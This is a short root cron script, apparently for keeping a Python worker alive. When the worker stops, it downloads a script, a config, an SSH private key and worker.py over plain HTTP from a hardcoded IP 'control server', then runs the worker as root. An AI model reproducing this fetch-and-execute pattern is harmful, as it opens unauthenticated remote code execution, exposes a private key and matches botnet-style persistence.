# */5 * * * * /bin/bash /root/start.sh
CONTROL_SERVER=http://46.101.108.124
pgrep -f worker.py > /dev/null;
if [ $? -eq 1 ]
then
   wget -N -O /root/restart.sh ${CONTROL_SERVER}/restart.sh
   wget -N -O /root/config.yaml ${CONTROL_SERVER}/config.yaml
   wget -N -O /root/id_rsa ${CONTROL_SERVER}/id_rsa
   wget -N -O /root/worker.py ${CONTROL_SERVER}/worker.py
   (/usr/bin/python /root/worker.py >> /root/worker-cron.log 2>&1) &
fi
